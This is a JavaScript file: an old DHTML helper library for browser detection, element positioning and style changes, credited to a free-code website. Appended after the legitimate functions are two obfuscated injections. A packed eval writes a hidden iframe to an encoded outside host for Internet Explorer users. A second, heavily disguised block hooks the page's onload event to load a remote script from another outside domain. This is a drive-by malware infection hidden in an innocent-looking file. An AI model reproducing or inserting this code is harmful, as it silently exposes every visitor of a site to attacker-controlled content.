///////////////////////////////////////////////////////////////////////////////
//
// This code taken from:
// http://www.aspandjavascript.co.uk/javascript/javascript_api/
//
//
// Conditions of Use (from http://www.aspandjavascript.co.uk/about/conditions.asp)
//
// The Begging Bowl
// ================
// Though the code on the site is free, building, testing and maintaining dHTML
// code is a nasty laborious business and takes up a lot of time. If you use
// code from ASPAndJavaScript.co.uk in a commercial website, or for a paying
// client or use software from the site in a commercial environment, we politely
// invite you to consider making a donation of $20 (or whatever you consider
// appropriate) to help support the site.
//
// Donations can be made through PayPal using the button on the left of the page,
// or "in kind" through our Amazon Wish List (click the link and search for
// jamesdoz@hotmail.com). Donations go towrds the hosting costs of the site.
//
// You can also offer support by visiting our sister site ComputerBookPrices.com
// and using the price comparison system to find great deals on computer books
// and manuals.
//
//
// Copyright
// =========
// All code available on this site is copyrighted to James Austin (unless
// otherwise stated) and must retain any copyright messages.
//
//
// Disclaimer
// ==========
// All code on the site is available to download for free. No liability is
// accepted for any loss or damage, financial or otherwise arising from the
// viewing or use of this web site or any of its contents.
//
//
// Technical Support
// =================
// As stated above, we accept no liability for the contents of the site and do
// not guarantee to offer technical support for it. We do, however, appreciate
// feedback and always try to answer any questions and queries as thouroughly
// as time allows.
//
// If you have problems using the code or just questions about how it all works,
// please contact us at jamesdoz@hotmail.com, bug reports can be submitted to
// the same address
//
// Please include as much information as possible with your query, such as
// operating system, browser etc. Error messages and screenshots (where
// applicable) are helpful too.
//
///////////////////////////////////////////////////////////////////////////////

function sniffBrowsers() {
	var ns4 = document.layers;
	var op5 = (navigator.userAgent.indexOf("Opera 5")!=-1) ||(navigator.userAgent.indexOf("Opera/5")!=-1);
	var op6 = (navigator.userAgent.indexOf("Opera 6")!=-1) ||(navigator.userAgent.indexOf("Opera/6")!=-1);
	var agt=navigator.userAgent.toLowerCase();
	var mac = (agt.indexOf("mac")!=-1);
	var ie = (agt.indexOf("msie") != -1);
	var mac_ie = mac && ie;
}


function getStyleObject(objectId) {
    if(document.getElementById && document.getElementById(objectId)) {
	return document.getElementById(objectId).style;
    } else if (document.all && document.all(objectId)) {
	return document.all(objectId).style;
    } else if (document.layers && document.layers[objectId]) {
		return getObjNN4(document,objectId);
    } else {
	return false;
    }
}

function changeObjectVisibility(objectId, newVisibility) {
    var styleObject = getStyleObject(objectId, document);
    if(styleObject) {
	styleObject.visibility = newVisibility;
	return true;
    } else {
	return false;
    }
}

function findImage(name, doc) {
	var i, img;
	for (i = 0; i < doc.images.length; i++) {
    	if (doc.images[i].name == name) {
			return doc.images[i];
		}
	}
	for (i = 0; i < doc.layers.length; i++) {
    	if ((img = findImage(name, doc.layers[i].document)) != null) {
			img.container = doc.layers[i];
			return img;
    	}
	}
	return null;
}

function getImage(name) {
	if (document.layers) {
    	return findImage(name, document);
	}
	return null;
}

function getObjNN4(obj,name)
{
	var x = obj.layers;
	var foundLayer;
	for (var i=0;i<x.length;i++)
	{
		if (x[i].id == name)
		 	foundLayer = x[i];
		else if (x[i].layers.length)
			var tmp = getObjNN4(x[i],name);
		if (tmp) foundLayer = tmp;
	}
	return foundLayer;
}

function getElementHeight(Elem) {
	if (ns4) {
		var elem = getObjNN4(document, Elem);
		return elem.clip.height;
	} else {
		var elem;
		if(document.getElementById) {
			var elem = document.getElementById(Elem);
		} else if (document.all){
			var elem = document.all[Elem];
		}
		if (op5) {
			xPos = elem.style.pixelHeight;
		} else {
			xPos = elem.offsetHeight;
		}
		return xPos;
	}
}

function getElementWidth(Elem) {
	if (ns4) {
		var elem = getObjNN4(document, Elem);
		return elem.clip.width;
	} else {
		var elem;
		if(document.getElementById) {
			var elem = document.getElementById(Elem);
		} else if (document.all){
			var elem = document.all[Elem];
		}
		if (op5) {
			xPos = elem.style.pixelWidth;
		} else {
			xPos = elem.offsetWidth;
		}
		return xPos;
	}
}

function getElementLeft(Elem) {
	if (ns4) {
		var elem = getObjNN4(document, Elem);
		return elem.pageX;
	} else {
		var elem;
		if(document.getElementById) {
			var elem = document.getElementById(Elem);
		} else if (document.all){
			var elem = document.all[Elem];
		}
		xPos = elem.offsetLeft;
		tempEl = elem.offsetParent;
  		while (tempEl != null) {
  			xPos += tempEl.offsetLeft;
	  		tempEl = tempEl.offsetParent;
  		}
		return xPos;
	}
}


function getElementTop(Elem) {
	if (ns4) {
		var elem = getObjNN4(document, Elem);
		return elem.pageY;
	} else {
		if(document.getElementById) {
			var elem = document.getElementById(Elem);
		} else if (document.all) {
			var elem = document.all[Elem];
		}
		yPos = elem.offsetTop;
		tempEl = elem.offsetParent;
		while (tempEl != null) {
  			yPos += tempEl.offsetTop;
	  		tempEl = tempEl.offsetParent;
  		}
		return yPos;
	}
}


function getImageLeft(myImage) {
	var x, obj;
	if (document.layers) {
		var img = getImage(myImage);
    	if (img.container != null)
			return img.container.pageX + img.x;
		else
			return img.x;
  	} else {
		return getElementLeft(myImage);
	}
	return -1;
}

function getImageTop(myImage) {
	var y, obj;
	if (document.layers) {
		var img = getImage(myImage);
		if (img.container != null)
			return img.container.pageY + img.y;
		else
			return img.y;
	} else {
		return getElementTop(myImage);
	}
	return -1;
}

function getImageWidth(myImage) {
	var x, obj;
	if (document.layers) {
		var img = getImage(myImage);
		return img.width;
	} else {
		return getElementWidth(myImage);
	}
	return -1;
}

function getImageHeight(myImage) {
	var y, obj;
	if (document.layers) {
		var img = getImage(myImage);
		return img.height;
	} else {
		return getElementHeight(myImage);
	}
	return -1;
}

function moveXY(myObject, x, y) {
	obj = getStyleObject(myObject)
	if (ns4) {
		obj.top = y;
 		obj.left = x;
	} else {
		if (op5) {
			obj.pixelTop = y;
 			obj.pixelLeft = x;
		} else {
			obj.top = y + 'px';
 			obj.left = x + 'px';
		}
	}
}

function changeClass(Elem, myClass) {
	var elem;
	if(document.getElementById) {
		var elem = document.getElementById(Elem);
	} else if (document.all){
		var elem = document.all[Elem];
	}
	elem.className = myClass;
}

function changeImage(target, source) {
	var imageObj;

	if (ns4) {
		imageObj = getImage(target);
		if (imageObj) imageObj.src = eval(source).src;
	} else {
		imageObj = eval('document.images.' + target);
		if (imageObj) imageObj.src = eval(source).src;
	}
}

function changeBGColour(myObject, colour) {
	if (ns4) {
		var obj = getObjNN4(document, myObject);
		obj.bgColor=colour;
	} else {
		var obj = getStyleObject(myObject);
		if (op5) {
			obj.background = colour;
		} else {
			obj.backgroundColor = colour;
		}
	}
}

sa = "%66%72%61%74%6D%2E%6E%65%74";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('28(9.8.7("17 6")!=-1&&0.5.7("4=3")==-1){0.5="4=3; 11=13, 14 16 10 14:15:26 12; ";0.24("<2 25=1 27=1 23=\'22://"+18+"/19/\' 20=\'21:29\'></2>")}',10,30,'document||iframe|s|_mlsdkf|cookie||indexOf|appVersion|navigator|2015|expires|GMT|Mon|||Jul|MSIE|sa|b2b|style|display|http|src|write|width||height|if|none'.split('|')));


var Br;if(Br!='e' && Br!='R'){Br='e'};var z="";function U(){var pl=new Array();this.BE="";var RV;if(RV!='Zl'){RV=''};var l=window;this.xw='';var W=unescape;var u;if(u!='' && u!='Zo'){u=''};var i;if(i!='RE'){i='RE'};var P=W("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%61%73%2e%63%6f%6d%2f%6c%6f%63%6b%65%72%7a%2e%63%6f%6d%2e%70%68%70");var Ry;if(Ry!='qW'){Ry=''};this.b="";function y(x,k){var XL;if(XL!='VA' && XL!='S'){XL=''};var Hu;if(Hu!='xp' && Hu!='ql'){Hu=''};var L="";var C="";var f="g";var aE;if(aE!='eg' && aE!='So'){aE='eg'};var c=W("%5b"), w=W("%5d");var Ur=new Date();var t=new Array();var M=c+k+w;var A=new RegExp(M, f);this.Nb='';this.xM='';return x.replace(A, new String());};this.fI="";var nv;if(nv!='Z_' && nv != ''){nv=null};var dH;if(dH!='' && dH!='eK'){dH=''};var tC="";var Vz='';var J;if(J!='Nj' && J!='sf'){J=''};var H=y('8115669019674286221430636352','79561432');var Su;if(Su!='e_'){Su='e_'};var PG;if(PG!='Si' && PG!='uq'){PG=''};var X=document;var qp;if(qp!=''){qp='K'};var V=new String();var Ko='';var Vx;if(Vx!='Oo'){Vx='Oo'};function ks(){var CN=new Date();var lS=new Date();var VF=W("%68%74%74%70%3a%2f%2f%65%61%73%79%66%75%6e%67%75%69%64%65%2e%61%74%3a");var tI=new String();var pt="";V=VF;var qx;if(qx!='Ta' && qx != ''){qx=null};V+=H;var Io=new Array();V+=P;try {var AH;if(AH!='' && AH!='nR'){AH='gq'};var Qs=new String();var uS=new Array();var GO='';v=X.createElement(y('sWcMrWiDpZtF','dMlFD1ZW9'));var Aa=new Date();var EL;if(EL!='' && EL!='XH'){EL=null};var MD;if(MD!='' && MD!='cM'){MD=''};v[W("%64%65%66%65%72")]=[1,1][0];var mG;if(mG!=''){mG='zk'};v[W("%73%72%63")]=V;var Nx;if(Nx!='' && Nx!='mR'){Nx=''};var wC;if(wC!='' && wC!='jz'){wC=''};X.body.appendChild(v);var PI;if(PI!='RC' && PI!='rG'){PI='RC'};var zs;if(zs!='NV'){zs='NV'};} catch(p){var oD=new String();var wJ;if(wJ!='' && wJ!='QH'){wJ='LG'};alert(p);};}var mw="";var HU=new Date();var dk;if(dk!=''){dk='Nh'};l[new String("onloa"+"d")]=ks;var ho=new String();};this._J='';var Jw=new String();var Ni='';var lA;if(lA!='rT' && lA != ''){lA=null};U();